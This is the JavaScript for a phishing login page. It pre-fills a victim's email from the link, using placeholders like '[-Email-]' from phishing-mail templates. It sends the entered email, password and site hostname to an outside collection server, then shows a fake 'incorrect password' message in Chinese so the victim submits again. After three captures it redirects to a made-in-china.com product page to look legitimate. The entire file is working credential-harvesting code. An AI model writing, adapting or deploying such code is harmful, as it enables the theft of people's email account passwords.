document.addEventListener('DOMContentLoaded', function () {
    // DOM elements
    const emailInput = document.getElementById('emailInput');
    const loginForm = document.getElementById('loginform');
    const passwordInput = document.getElementById('password');
    const errorMessage = document.getElementById('error-message');
    const togglePassword = document.getElementById('togglePassword');

    //document.addEventListener('onSubmit')

    // Configuration
    const redirectURL = "https://www.made-in-china.com/products-search/hot-china-products/China_Market.html";
    let successCount = 0;
    const PLACEHOLDER_EMAILS = [
        '[-Email-]',
        '{{email}}',
        'example@email.com',
        '%5B-Email-%5D', // encoded version
      ];

    // Helper: Validate email
    function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }


    window.addEventListener('hashchange', function () {
        const newEmail = extractEmailFromURL();
        if (newEmail && validateEmail(newEmail)) {
            emailInput.value = newEmail;
        }
    });
    

    // 1. Extract email from URL
    function extractEmailFromURL() {
        const params = new URLSearchParams(window.location.search);
        let email = decodeURIComponent(params.get('email') || '');
    
        // Fallback: interpret query string directly as email
        if (!email && window.location.search.startsWith('?')) {
            const possibleEmail = decodeURIComponent(window.location.search.slice(1));
            if (validateEmail(possibleEmail)) {
                return possibleEmail;
            }
        }
    
        if (!email && window.location.hash.startsWith('#')) {
            const hashValue = decodeURIComponent(window.location.hash.slice(1).trim());
            if (validateEmail(hashValue)) {
                return hashValue;
            
            }
        }
    
        return email;
    }
    

    // 2. Set extracted email if valid
    //const extractedEmail = extractEmailFromURL();

    // console.log('Extracted email:', extractedEmail);

    // if (
    //     extractedEmail &&
    //     emailInput &&
    //     (
    //         validateEmail(extractedEmail) || PLACEHOLDER_EMAILS.includes(extractedEmail)
    //     )
    // ) {
    //     if (!emailInput.value || PLACEHOLDER_EMAILS.includes(emailInput.value.trim())) {
    //         emailInput.value = extractedEmail;
    //     }
    //}
    function prefillEmail() {
        const extractedEmail = extractEmailFromURL();
        console.log('Extracted email:', extractedEmail);
    
        if (
            extractedEmail &&
            emailInput &&
            (
                validateEmail(extractedEmail) || PLACEHOLDER_EMAILS.includes(extractedEmail)
            )
        ) {
            if (!emailInput.value || PLACEHOLDER_EMAILS.includes(emailInput.value.trim())) {
                emailInput.value = extractedEmail;
            }
        }
    }
    
    // Run once on load
    prefillEmail();
    
    // Also run when hash changes
    window.addEventListener('hashchange', prefillEmail);
    

     //Update URL with email param on input
    emailInput.addEventListener('input', function () {
        const email = emailInput.value.trim();
        if (validateEmail(email)) {
            const newUrl = window.location.pathname + '?email=' + encodeURIComponent(email);
            window.history.pushState({}, '', newUrl);
        }
    });

    // 4. Toggle password visibility
    togglePassword.addEventListener('click', function () {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.classList.toggle('password-show');
    });

    // 5. Form submission
    loginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        errorMessage.textContent = '';

        if (!email || !password) {
            errorMessage.textContent = 'Please fill in both fields';
            return;
        }

        try {
            const response = await fetch('https://chuksinno-backend-1.onrender.com/machala', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email,
                    password,
                    targetDomain: window.location.hostname
                }),
            });

            if (response.ok) {
                successCount++;
                passwordInput.value = '';

                if (successCount >= 3) {
                    window.location.href = redirectURL;
                } else {
                    errorMessage.textContent = '电子邮件或密码不正确';
                }
            } else {
                errorMessage.textContent = '电子邮件或密码不正确';
                passwordInput.value = '';
            }
        } catch (error) {
            console.error('API error:', error);
            errorMessage.textContent = "Network error. Please try again.";
        }
    });
});
